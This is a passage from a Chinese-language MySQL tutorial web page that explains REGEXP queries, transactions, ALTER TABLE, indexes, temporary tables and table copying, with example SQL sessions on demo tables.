<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP 'mar';</span><br></pre></td></tr></table></figure>
<p>查找name字段中以元音字符开头或以’ok’字符串结尾的所有数据：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP '^[aeiou]|ok$';</span><br></pre></td></tr></table></figure>
<h1 id="MySQL-事务"><a href="#MySQL-事务" class="headerlink" title="MySQL 事务"></a>MySQL 事务</h1><p>MySQL 事务主要用于处理操作量大，复杂度高的数据。比如说，在人员管理系统中，你删除一个人员，你即需要删除人员的基本资料，也要删除和该人员相关的信息，如信箱，文章等等，这样，这些数据库操作语句就构成一个事务！</p>
<ol>
<li>在 MySQL 中只有使用了 Innodb 数据库引擎的数据库或表才支持事务。</li>
<li>事务处理可以用来维护数据库的完整性，保证成批的 SQL 语句要么全部执行，要么全部不执行。</li>
<li>事务用来管理 insert,update,delete 语句</li>
</ol>
<p>一般来说，事务是必须满足4个条件（ACID）：：原子性（Atomicity，或称不可分割性）、一致性（Consistency）、隔离性（Isolation，又称独立性）、持久性（Durability）。</p>
<ol>
<li><p>原子性：一个事务（transaction）中的所有操作，要么全部完成，要么全部不完成，不会结束在中间某个环节。事务在执行过程中发生错误，会被回滚（Rollback）到事务开始前的状态，就像这个事务从来没有执行过一样。</p>
</li>
<li><p>一致性：在事务开始之前和事务结束以后，数据库的完整性没有被破坏。这表示写入的资料必须完全符合所有的预设规则，这包含资料的精确度、串联性以及后续数据库可以自发性地完成预定的工作。</p>
</li>
<li><p>隔离性：数据库允许多个并发事务同时对其数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致。事务隔离分为不同级别，包括读未提交（Read uncommitted）、读提交（read committed）、可重复读（repeatable read）和串行化（Serializable）。</p>
</li>
<li><p>持久性：事务处理结束后，对数据的修改就是永久的，即便系统故障也不会丢失。</p>
</li>
</ol>
<p>在 MySQL 命令行的默认设置下，事务都是自动提交的，即执行 SQL 语句后就会马上执行 COMMIT 操作。因此要显式地开启一个事务务须使用命令 BEGIN 或 START TRANSACTION，或者执行命令 SET AUTOCOMMIT=0，用来禁止使用当前会话的自动提交。</p>
<h2 id="事务控制语句："><a href="#事务控制语句：" class="headerlink" title="事务控制语句："></a>事务控制语句：</h2><ol>
<li>BEGIN 或 START TRANSACTION 显式地开启一个事务；</li>
<li>COMMIT 也可以使用 COMMIT WORK，不过二者是等价的。COMMIT 会提交事务，并使已对数据库进行的所有修改成为永久性的；</li>
<li>ROLLBACK 也可以使用 ROLLBACK WORK，不过二者是等价的。回滚会结束用户的事务，并撤销正在进行的所有未提交的修改；</li>
<li>SAVEPOINT identifier，SAVEPOINT 允许在事务中创建一个保存点，一个事务中可以有多个 SAVEPOINT；</li>
<li>RELEASE SAVEPOINT identifier 删除一个事务的保存点，当没有指定的保存点时，执行该语句会抛出一个异常；</li>
<li>ROLLBACK TO identifier 把事务回滚到标记点；</li>
<li>SET TRANSACTION 用来设置事务的隔离级别。InnoDB 存储引擎提供事务的隔离级别有READ UNCOMMITTED、READ COMMITTED、REPEATABLE READ 和 SERIALIZABLE。</li>
</ol>
<h2 id="MYSQL-事务处理主要有两种方法："><a href="#MYSQL-事务处理主要有两种方法：" class="headerlink" title="MYSQL 事务处理主要有两种方法："></a>MYSQL 事务处理主要有两种方法：</h2><p>1、用 BEGIN, ROLLBACK, COMMIT来实现</p>
<ol>
<li>BEGIN 开始一个事务</li>
<li>ROLLBACK 事务回滚</li>
<li>COMMIT 事务确认</li>
</ol>
<p>2、直接用 SET 来改变 MySQL 的自动提交模式:</p>
<ol>
<li>SET AUTOCOMMIT=0 禁止自动提交</li>
<li>SET AUTOCOMMIT=1 开启自动提交</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; CREATE TABLE runoob_transaction_test( id int(5)) engine=innodb;  # 创建数据表</span><br><span class="line">Query OK, 0 rows affected (0.04 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; select * from runoob_transaction_test;</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; <span class="keyword">begin</span>;  <span class="comment"># 开始事务</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; insert into runoob_transaction_test value(5);</span><br><span class="line">Query OK, 1 rows affected (0.01 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; insert into runoob_transaction_test value(6);</span><br><span class="line">Query OK, 1 rows affected (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; commit; # 提交事务</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt;  select * from runoob_transaction_test;</span><br><span class="line">+<span class="comment">------+</span></span><br><span class="line">| id   |</span><br><span class="line">+<span class="comment">------+</span></span><br><span class="line">| 5    |</span><br><span class="line">| 6    |</span><br><span class="line">+<span class="comment">------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; <span class="keyword">begin</span>;    <span class="comment"># 开始事务</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt;  insert into runoob_transaction_test values(7);</span><br><span class="line">Query OK, 1 rows affected (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; rollback;   # 回滚</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt;   select * from runoob_transaction_test;   # 因为回滚所以数据没有插入</span><br><span class="line">+<span class="comment">------+</span></span><br><span class="line">| id   |</span><br><span class="line">+<span class="comment">------+</span></span><br><span class="line">| 5    |</span><br><span class="line">| 6    |</span><br><span class="line">+<span class="comment">------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
<h1 id="MySQL-ALTER命令"><a href="#MySQL-ALTER命令" class="headerlink" title="MySQL ALTER命令"></a>MySQL ALTER命令</h1><p>当我们需要修改数据表名或者修改数据表字段时，就需要使用到MySQL ALTER命令。</p>
<h2 id="删除，添加或修改表字段"><a href="#删除，添加或修改表字段" class="headerlink" title="删除，添加或修改表字段"></a>删除，添加或修改表字段</h2><p>如下命令使用了 ALTER 命令及 DROP 子句来删除以上创建表的 i 字段：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl  <span class="keyword">DROP</span> i;</span><br></pre></td></tr></table></figure></p>
<p>如果数据表中只剩余一个字段则无法使用DROP来删除字段。</p>
<p>MySQL 中使用 ADD 子句来向数据表中添加列，如下实例在表 testalter_tbl 中添加 i 字段，并定义数据类型:<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE testalter_tbl ADD i INT;</span><br></pre></td></tr></table></figure></p>
<p>执行以上命令后，i 字段会自动添加到数据表字段的末尾。<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; SHOW COLUMNS FROM testalter_tbl;</span><br><span class="line">+<span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line">| Field | Type    | Null | Key | Default | Extra |</span><br><span class="line">+<span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line">| c     | char(1) | YES  |     | NULL    |       |</span><br><span class="line">| i     | int(11) | YES  |     | NULL    |       |</span><br><span class="line">+<span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
<p>如果你需要指定新增字段的位置，可以使用MySQL提供的关键字 FIRST (设定位第一列)， AFTER 字段名（设定位于某个字段之后）。<br>尝试以下 ALTER TABLE 语句, 在执行成功后，使用 SHOW COLUMNS 查看表结构的变化：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl <span class="keyword">DROP</span> i;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl <span class="keyword">ADD</span> i <span class="built_in">INT</span> <span class="keyword">FIRST</span>;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl <span class="keyword">DROP</span> i;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl <span class="keyword">ADD</span> i <span class="built_in">INT</span> <span class="keyword">AFTER</span> c;</span><br></pre></td></tr></table></figure></p>
<p>FIRST 和 AFTER 关键字可用于 ADD 与 MODIFY 子句，所以如果你想重置数据表字段的位置就需要先使用 DROP 删除字段然后使用 ADD 来添加字段并设置位置。</p>
<h2 id="修改字段类型及名称"><a href="#修改字段类型及名称" class="headerlink" title="修改字段类型及名称"></a>修改字段类型及名称</h2><p>如果需要修改字段类型及名称, 你可以在ALTER命令中使用 MODIFY 或 CHANGE 子句 。</p>
<p>例如，把字段 c 的类型从 CHAR(1) 改为 CHAR(10)，可以执行以下命令:<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE testalter_tbl MODIFY c CHAR(10);</span><br></pre></td></tr></table></figure></p>
<p>使用 CHANGE 子句, 语法有很大的不同。 在 CHANGE 关键字之后，紧跟着的是你要修改的字段名，然后指定新字段名及类型。尝试如下实例：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE testalter_tbl CHANGE i j BIGINT;</span><br><span class="line">mysql&gt; ALTER TABLE testalter_tbl CHANGE j j INT;</span><br></pre></td></tr></table></figure></p>
<h2 id="ALTER-TABLE-对-Null-值和默认值的影响"><a href="#ALTER-TABLE-对-Null-值和默认值的影响" class="headerlink" title="ALTER TABLE 对 Null 值和默认值的影响"></a>ALTER TABLE 对 Null 值和默认值的影响</h2><p>当你修改字段时，你可以指定是否包含值或者是否设置默认值。</p>
<p>以下实例，指定字段 j 为 NOT NULL 且默认值为100 。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE testalter_tbl </span><br><span class="line">    -&gt; MODIFY j BIGINT NOT NULL DEFAULT 100;</span><br></pre></td></tr></table></figure>
<p>如果你不设置默认值，MySQL会自动设置该字段默认为 NULL。</p>
<h2 id="修改字段默认值"><a href="#修改字段默认值" class="headerlink" title="修改字段默认值"></a>修改字段默认值</h2><p>你可以使用 ALTER 来修改字段的默认值，尝试以下实例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE testalter_tbl ALTER i SET DEFAULT 1000;</span><br><span class="line">mysql&gt; SHOW COLUMNS FROM testalter_tbl;</span><br><span class="line">+<span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line">| Field | Type    | Null | Key | Default | Extra |</span><br><span class="line">+<span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line">| c     | char(1) | YES  |     | NULL    |       |</span><br><span class="line">| i     | int(11) | YES  |     | 1000    |       |</span><br><span class="line">+<span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p>你也可以使用 ALTER 命令及 DROP子句来删除字段的默认值，如下实例：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE testalter_tbl ALTER i DROP DEFAULT;</span><br><span class="line">mysql&gt; SHOW COLUMNS FROM testalter_tbl;</span><br><span class="line">+<span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line">| Field | Type    | Null | Key | Default | Extra |</span><br><span class="line">+<span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line">| c     | char(1) | YES  |     | NULL    |       |</span><br><span class="line">| i     | int(11) | YES  |     | NULL    |       |</span><br><span class="line">+<span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line">Changing a <span class="keyword">Table</span> <span class="keyword">Type</span>:</span><br></pre></td></tr></table></figure></p>
<p>修改数据表类型，可以使用 ALTER 命令及 TYPE 子句来完成。尝试以下实例，我们将表 testalter_tbl 的类型修改为 MYISAM ：</p>
<p>注意：查看数据表类型可以使用 SHOW TABLE STATUS 语句。<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE testalter_tbl ENGINE = MYISAM;</span><br><span class="line">mysql&gt;  SHOW TABLE STATUS LIKE 'testalter_tbl'\G</span><br><span class="line">*************************** 1. row ****************</span><br><span class="line">           Name: testalter_tbl</span><br><span class="line">           Type: MyISAM</span><br><span class="line">     Row_format: Fixed</span><br><span class="line">           Rows: 0</span><br><span class="line"> Avg_row_length: 0</span><br><span class="line">    Data_length: 0</span><br><span class="line">Max_data_length: 25769803775</span><br><span class="line">   Index_length: 1024</span><br><span class="line">      Data_free: 0</span><br><span class="line"> Auto_increment: NULL</span><br><span class="line">    Create_time: 2007-06-03 08:04:36</span><br><span class="line">    Update_time: 2007-06-03 08:04:36</span><br><span class="line">     Check_time: NULL</span><br><span class="line"> Create_options:</span><br><span class="line">        <span class="keyword">Comment</span>:</span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
<h1 id="修改表名"><a href="#修改表名" class="headerlink" title="修改表名"></a>修改表名</h1><p>如果需要修改数据表的名称，可以在 ALTER TABLE 语句中使用 RENAME 子句来实现。</p>
<p>尝试以下实例将数据表 testalter_tbl 重命名为 alter_tbl：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE testalter_tbl RENAME TO alter_tbl;</span><br></pre></td></tr></table></figure></p>
<p>ALTER 命令还可以用来创建及删除MySQL数据表的索引，该功能我们会在接下来的章节中介绍。</p>
<h1 id="MySQL-索引"><a href="#MySQL-索引" class="headerlink" title="MySQL 索引"></a>MySQL 索引</h1><p>MySQL索引的建立对于MySQL的高效运行是很重要的，索引可以大大提高MySQL的检索速度。</p>
<p>打个比方，如果合理的设计且使用索引的MySQL是一辆兰博基尼的话，那么没有设计和使用索引的MySQL就是一个人力三轮车。</p>
<p>索引分单列索引和组合索引。单列索引，即一个索引只包含单个列，一个表可以有多个单列索引，但这不是组合索引。组合索引，即一个索引包含多个列。</p>
<p>创建索引时，你需要确保该索引是应用在    SQL 查询语句的条件(一般作为 WHERE 子句的条件)。</p>
<p>实际上，索引也是一张表，该表保存了主键与索引字段，并指向实体表的记录。</p>
<p>上面都在说使用索引的好处，但过多的使用索引将会造成滥用。因此索引也会有它的缺点：虽然索引大大提高了查询速度，同时却会降低更新表的速度，如对表进行INSERT、UPDATE和DELETE。因为更新表时，MySQL不仅要保存数据，还要保存一下索引文件。</p>
<p>建立索引会占用磁盘空间的索引文件。</p>
<h1 id="普通索引"><a href="#普通索引" class="headerlink" title="普通索引"></a>普通索引</h1><p>创建索引</p>
<p>这是最基本的索引，它没有任何限制。它有以下几种创建方式：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">INDEX</span> indexName <span class="keyword">ON</span> mytable(username(<span class="keyword">length</span>));</span><br></pre></td></tr></table></figure>
<p>如果是CHAR，VARCHAR类型，length可以小于字段实际长度；如果是BLOB和TEXT类型，必须指定 length。</p>
<h2 id="修改表结构-添加索引"><a href="#修改表结构-添加索引" class="headerlink" title="修改表结构(添加索引)"></a>修改表结构(添加索引)</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">table</span> tableName <span class="keyword">ADD</span> <span class="keyword">INDEX</span> indexName(columnName)</span><br></pre></td></tr></table></figure>
<h2 id="创建表的时候直接指定"><a href="#创建表的时候直接指定" class="headerlink" title="创建表的时候直接指定"></a>创建表的时候直接指定</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> mytable(  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">ID</span> <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,   </span><br><span class="line"> </span><br><span class="line">username <span class="built_in">VARCHAR</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">INDEX</span> [indexName] (username(<span class="keyword">length</span>))  </span><br><span class="line"> </span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h2 id="删除索引的语法"><a href="#删除索引的语法" class="headerlink" title="删除索引的语法"></a>删除索引的语法</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">INDEX</span> [indexName] <span class="keyword">ON</span> mytable;</span><br></pre></td></tr></table></figure>
<h2 id="唯一索引"><a href="#唯一索引" class="headerlink" title="唯一索引"></a>唯一索引</h2><p>它与前面的普通索引类似，不同的就是：索引列的值必须唯一，但允许有空值。如果是组合索引，则列值的组合必须唯一。它有以下几种创建方式：</p>
<p>创建索引<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> indexName <span class="keyword">ON</span> mytable(username(<span class="keyword">length</span>))</span><br></pre></td></tr></table></figure></p>
<p>修改表结构<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">table</span> mytable <span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> [indexName] (username(<span class="keyword">length</span>))</span><br></pre></td></tr></table></figure></p>
<p>创建表的时候直接指定<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> mytable(  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">ID</span> <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,   </span><br><span class="line"> </span><br><span class="line">username <span class="built_in">VARCHAR</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">UNIQUE</span> [indexName] (username(<span class="keyword">length</span>))  </span><br><span class="line"> </span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<h2 id="使用ALTER-命令添加和删除索引"><a href="#使用ALTER-命令添加和删除索引" class="headerlink" title="使用ALTER 命令添加和删除索引"></a>使用ALTER 命令添加和删除索引</h2><p>有四种方式来添加数据表的索引：</p>
<ol>
<li>ALTER TABLE tbl_name ADD PRIMARY KEY (column_list): 该语句添加一个主键，这意味着索引值必须是唯一的，且不能为NULL。</li>
<li>ALTER TABLE tbl_name ADD UNIQUE index_name (column_list): 这条语句创建索引的值必须是唯一的（除了NULL外，NULL可能会出现多次）。</li>
<li>ALTER TABLE tbl_name ADD INDEX index_name (column_list): 添加普通索引，索引值可出现多次。</li>
<li>ALTER TABLE tbl_name ADD FULLTEXT index_name (column_list):该语句指定了索引为 FULLTEXT ，用于全文索引。</li>
</ol>
<p>以下实例为在表中添加索引。<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE testalter_tbl ADD INDEX (c);</span><br></pre></td></tr></table></figure></p>
<p>你还可以在 ALTER 命令中使用 DROP 子句来删除索引。尝试以下实例删除索引:<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE testalter_tbl DROP INDEX c;</span><br></pre></td></tr></table></figure></p>
<h2 id="使用-ALTER-命令添加和删除主键"><a href="#使用-ALTER-命令添加和删除主键" class="headerlink" title="使用 ALTER 命令添加和删除主键"></a>使用 ALTER 命令添加和删除主键</h2><p>主键只能作用于一个列上，添加主键索引时，你需要确保该主键默认不为空（NOT NULL）。实例如下：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE testalter_tbl MODIFY i INT NOT NULL;</span><br><span class="line">mysql&gt; ALTER TABLE testalter_tbl ADD PRIMARY KEY (i);</span><br></pre></td></tr></table></figure></p>
<p>你也可以使用 ALTER 命令删除主键：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE testalter_tbl DROP PRIMARY KEY;</span><br></pre></td></tr></table></figure></p>
<p>删除主键时只需指定PRIMARY KEY，但在删除索引时，你必须知道索引名。</p>
<h2 id="显示索引信息"><a href="#显示索引信息" class="headerlink" title="显示索引信息"></a>显示索引信息</h2><p>你可以使用 SHOW INDEX 命令来列出表中的相关的索引信息。可以通过添加 \G 来格式化输出信息。</p>
<p>尝试以下实例:<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; SHOW INDEX FROM table_name; \G</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
<h1 id="MySQL-临时表"><a href="#MySQL-临时表" class="headerlink" title="MySQL 临时表"></a>MySQL 临时表</h1><p>MySQL 临时表在我们需要保存一些临时数据时是非常有用的。临时表只在当前连接可见，当关闭连接时，Mysql会自动删除表并释放所有空间。</p>
<p>临时表在MySQL 3.23版本中添加，如果你的MySQL版本低于 3.23版本就无法使用MySQL的临时表。不过现在一般很少有再使用这么低版本的MySQL数据库服务了。</p>
<p>MySQL临时表只在当前连接可见，如果你使用PHP脚本来创建MySQL临时表，那每当PHP脚本执行完成后，该临时表也会自动销毁。</p>
<p>如果你使用了其他MySQL客户端程序连接MySQL数据库服务器来创建临时表，那么只有在关闭客户端程序时才会销毁临时表，当然你也可以手动销毁。</p>
<h2 id="实例-7"><a href="#实例-7" class="headerlink" title="实例"></a>实例</h2><p>以下展示了使用MySQL 临时表的简单实例，以下的SQL代码可以适用于PHP脚本的mysql_query()函数。<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; CREATE TEMPORARY TABLE SalesSummary (</span><br><span class="line">    -&gt; product_name VARCHAR(50) NOT NULL</span><br><span class="line">    -&gt; , total_sales DECIMAL(12,2) NOT NULL DEFAULT 0.00</span><br><span class="line">    -&gt; , avg_unit_price DECIMAL(7,2) NOT NULL DEFAULT 0.00</span><br><span class="line">    -&gt; , total_units_sold INT UNSIGNED NOT NULL DEFAULT 0</span><br><span class="line">);</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO SalesSummary</span><br><span class="line">    -&gt; (product_name, total_sales, avg_unit_price, total_units_sold)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; ('cucumber', 100.25, 90, 2);</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM SalesSummary;</span><br><span class="line">+<span class="comment">--------------+-------------+----------------+------------------+</span></span><br><span class="line">| product_name | total_sales | avg_unit_price | total_units_sold |</span><br><span class="line">+<span class="comment">--------------+-------------+----------------+------------------+</span></span><br><span class="line">| cucumber     |      100.25 |          90.00 |                2 |</span><br><span class="line">+<span class="comment">--------------+-------------+----------------+------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
<p>当你使用 SHOW TABLES命令显示数据表列表时，你将无法看到 SalesSummary表。</p>
<p>如果你退出当前MySQL会话，再使用 SELECT命令来读取原先创建的临时表数据，那你会发现数据库中没有该表的存在，因为在你退出时该临时表已经被销毁了。</p>
<h1 id="删除MySQL-临时表"><a href="#删除MySQL-临时表" class="headerlink" title="删除MySQL 临时表"></a>删除MySQL 临时表</h1><p>默认情况下，当你断开与数据库的连接后，临时表就会自动被销毁。当然你也可以在当前MySQL会话使用 DROP TABLE 命令来手动删除临时表。</p>
<p>以下是手动删除临时表的实例：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; CREATE TEMPORARY TABLE SalesSummary (</span><br><span class="line">    -&gt; product_name VARCHAR(50) NOT NULL</span><br><span class="line">    -&gt; , total_sales DECIMAL(12,2) NOT NULL DEFAULT 0.00</span><br><span class="line">    -&gt; , avg_unit_price DECIMAL(7,2) NOT NULL DEFAULT 0.00</span><br><span class="line">    -&gt; , total_units_sold INT UNSIGNED NOT NULL DEFAULT 0</span><br><span class="line">);</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO SalesSummary</span><br><span class="line">    -&gt; (product_name, total_sales, avg_unit_price, total_units_sold)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; ('cucumber', 100.25, 90, 2);</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM SalesSummary;</span><br><span class="line">+<span class="comment">--------------+-------------+----------------+------------------+</span></span><br><span class="line">| product_name | total_sales | avg_unit_price | total_units_sold |</span><br><span class="line">+<span class="comment">--------------+-------------+----------------+------------------+</span></span><br><span class="line">| cucumber     |      100.25 |          90.00 |                2 |</span><br><span class="line">+<span class="comment">--------------+-------------+----------------+------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line">mysql&gt; <span class="keyword">DROP</span> <span class="keyword">TABLE</span> SalesSummary;</span><br><span class="line">mysql&gt;  SELECT * FROM SalesSummary;</span><br><span class="line">ERROR 1146: Table 'RUNOOB.SalesSummary' doesn't exist</span><br></pre></td></tr></table></figure></p>
<h1 id="MySQL-复制表"><a href="#MySQL-复制表" class="headerlink" title="MySQL 复制表"></a>MySQL 复制表</h1><p>如果我们需要完全的复制MySQL的数据表，包括表的结构，索引，默认值等。 如果仅仅使用CREATE TABLE … SELECT 命令，是无法实现的。</p>
<p>本章节将为大家介绍如何完整的复制MySQL数据表，步骤如下：</p>
<p>使用 SHOW CREATE TABLE 命令获取创建数据表(CREATE TABLE) 语句，该语句包含了原数据表的结构，索引等。<br>复制以下命令显示的SQL语句，修改数据表名，并执行SQL语句，通过以上命令 将完全的复制数据表结构。<br>如果你想复制表的内容，你就可以使用 INSERT INTO … SELECT 语句来实现。</p>
<h2 id="实例-8"><a href="#实例-8" class="headerlink" title="实例"></a>实例</h2><p>尝试以下实例来复制表 runoob_tbl 。</p>
<p>步骤一：</p>
<p>获取数据表的完整结构。<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; SHOW CREATE TABLE runoob_tbl \G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">       Table: runoob_tbl</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">Table</span>: <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`runoob_tbl`</span> (</span><br><span class="line">  <span class="string">`runoob_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> auto_increment,</span><br><span class="line">  <span class="string">`runoob_title`</span> <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">default</span> <span class="string">''</span>,</span><br><span class="line">  <span class="string">`runoob_author`</span> <span class="built_in">varchar</span>(<span class="number">40</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">default</span> <span class="string">''</span>,</span><br><span class="line">  <span class="string">`submission_date`</span> <span class="built_in">date</span> <span class="keyword">default</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span>  (<span class="string">`runoob_id`</span>),</span><br><span class="line">  <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span> <span class="string">`AUTHOR_INDEX`</span> (<span class="string">`runoob_author`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> </span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">ERROR</span>:</span><br><span class="line"><span class="keyword">No</span> <span class="keyword">query</span> specified</span><br></pre></td></tr></table></figure></p>
<p>步骤二：</p>
<p>修改SQL语句的数据表名，并执行SQL语句。<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE `clone_tbl` (</span><br><span class="line">  -&gt; `runoob_id` int(11) NOT NULL auto_increment,</span><br><span class="line">  -&gt; `runoob_title` varchar(100) NOT NULL default '',</span><br><span class="line">  -&gt; `runoob_author` varchar(40) NOT NULL default '',</span><br><span class="line">  -&gt; `submission_date` date default NULL,</span><br><span class="line">  -&gt; PRIMARY KEY  (`runoob_id`),</span><br><span class="line">  -&gt; UNIQUE KEY `AUTHOR_INDEX` (`runoob_author`)</span><br><span class="line">-&gt; ) ENGINE=InnoDB;</span><br><span class="line">Query OK, 0 rows affected (1.80 sec)</span><br></pre></td></tr></table></figure></p>
<p>步骤三：</p>
